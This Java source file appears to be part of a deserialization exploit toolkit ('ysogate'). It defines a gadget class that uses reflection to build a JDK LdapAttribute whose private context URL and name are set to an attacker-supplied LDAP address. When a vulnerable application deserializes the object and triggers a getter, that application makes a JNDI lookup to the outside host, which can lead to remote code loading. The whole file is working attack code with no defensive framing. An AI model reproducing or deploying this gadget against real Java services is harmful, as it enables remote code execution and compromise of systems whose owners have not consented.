package com.h2tg.ysogate.bullet.jdk;

import com.h2tg.ysogate.bullet.base.IGetter2Lookup;

import javax.naming.CompositeName;
import javax.naming.directory.BasicAttribute;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URI;

public class GLdapAttr implements IGetter2Lookup
{

    @Override
    public Object getter2Lookup(String url) throws Exception
    {
        URI uri = new URI(url);

        // 提取基础URL部分: scheme://host:port
        String baseUrl = uri.getScheme() + "://" + uri.getHost();
        if (uri.getPort() != -1) {
            baseUrl += ":" + uri.getPort();
        }

        // 提取路径部分（去掉开头的斜杠）
        String path = uri.getPath();
        if (path != null && path.startsWith("/")) {
            path = path.substring(1);
        }

        try{
            Class clazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
            Constructor clazz_cons = clazz.getDeclaredConstructor(new Class[]{String.class});
            clazz_cons.setAccessible(true);
            BasicAttribute la = (BasicAttribute)clazz_cons.newInstance(new Object[]{"exp"});
            Field bcu_fi = clazz.getDeclaredField("baseCtxURL");
            bcu_fi.setAccessible(true);
            bcu_fi.set(la,baseUrl);
            CompositeName cn = new CompositeName();
            cn.add(path);
            cn.add("b");
            Field rdn_fi = clazz.getDeclaredField("rdn");
            rdn_fi.setAccessible(true);
            rdn_fi.set(la, cn);
            return la;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
